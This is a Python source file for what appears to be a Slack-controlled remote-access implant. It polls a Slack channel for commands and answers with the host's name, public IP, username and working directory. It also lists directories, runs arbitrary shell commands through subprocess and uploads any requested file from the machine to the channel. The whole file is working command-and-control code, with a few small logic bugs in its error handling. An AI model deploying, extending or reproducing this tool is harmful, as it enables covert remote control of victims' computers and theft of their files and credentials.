from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError
import time
import os
from pathlib import Path
from typing import Callable, Dict, List
import socket
import getpass
import requests
import subprocess

def handle_ping(schan, args, client, bot_name):
    message = "pong!"
    response = client.chat_postMessage(channel=schan, text=message, username=bot_name)
    
def handle_info(schan, args, client, bot_name):
    hostname = socket.gethostname()
    ip_address = requests.get('https://api.ipify.org').text
    cwd = Path.cwd()
    username = getpass.getuser()
    message = "hostname: "+ hostname+", ip_address: "+ip_address+", current_directory: "+str(cwd)+", username: "+username
    response = client.chat_postMessage(channel=schan, text=message, username=bot_name)
    
def handle_list_files(schan, args, client, bot_name):
    path = Path(args[0])
    if not path.exists():
        message = "The directory, "+args[0]+" does not exist"
    if not path.is_dir():
        message = "Error: The path "+args[0]+" is a file, not a directory."
    try:
        items = sorted([item.name for item in path.iterdir()])
        if not items:
            message = "Directory "+args[0]+" is empty."
        message = "\n".join(items)
    except:
        message = "You do not have permission to view "+args[0]+" or it does not exist"
    response = client.chat_postMessage(channel=schan, text=message, username=bot_name)

def handle_execute(schan, args, client, bot_name):
    try:
        result = subprocess.run(args, capture_output=True, text=True)
        message = result.stdout.strip()
    except:
        message =  "Command Failed"
    response = client.chat_postMessage(channel=schan, text=message, username=bot_name)

def handle_get_file(schan, args, client, bot_name):
    comment = "Here is your file!"
    
    if not os.path.exists(args[0]):
        message = "File does not exist at: "+args[0]
    filename = os.path.basename(args[0])
    try:
        response = client.files_upload_v2(channel=schan, file=args[0], title=filename, initial_comment=comment)
    except SlackApiError as e:
        print(f"Error: {e}")

def handle_help(schan, args, client, bot_name):
    message =  "Available commands: `ping`, `info`, `list_files <filepath>`, `execute <command>`, `get_file <full_file_path`, `help`"
    response = client.chat_postMessage(channel=schan, text=message, username=bot_name)

def handle_default(schan, args, client, bot_name):
    message = "I didn't recognize that command. Type 'help' for help"
    response = client.chat_postMessage(channel=schan, text=message, username=bot_name)


def read_cmd(rchan, client):
    try:
        result = client.conversations_history(channel=rchan, inclusive=True, limit=1)
        message = result["messages"][0]
        return message["text"]
    except SlackApiError as e:
        print(f"Error: {e}")
        
def send_cmd(schan, msg, client, bot_name):
    try:
        tokens = msg.strip().split()
        cmd = tokens[0].lower()
        args = tokens[1:]
        handler = COMMAND_DISPATCH.get(cmd, handle_default)
        return handler(schan, args, client, bot_name)
        
    except SlackApiError as e:
        print(f"Error: {e}")
        
def check_cmd(cmd, old_cmd, schan, client, bot_name):
    if cmd != old_cmd:
        send_cmd(schan, cmd, client, bot_name)
    else:
        print("Received old command and skipping")
    return(cmd)
    
COMMAND_DISPATCH: Dict[str, Callable[[dict, List[str]], str]] = {
    "ping": handle_ping,
    "info": handle_info,
    "get_file": handle_get_file,
    "list_files": handle_list_files,
    "execute": handle_execute,
    "help": handle_help
}

def run_slack_tasks(params: dict):
    
    my_token = params.get("oauth_token")
    send_ch = params.get("send_channel")
    recv_ch = params.get("recv_channel")
    bot_name = params.get("bot_name")
    old_cmd = ""
    client = WebClient(token=my_token)
    cwd = Path.cwd()
    print("Loading Complete, Starting Connection")
    while(True):
        command = read_cmd(recv_ch, client)
        time.sleep(5)
        old_cmd = check_cmd(command, old_cmd, send_ch, client, bot_name)
        time.sleep(5)
    
   
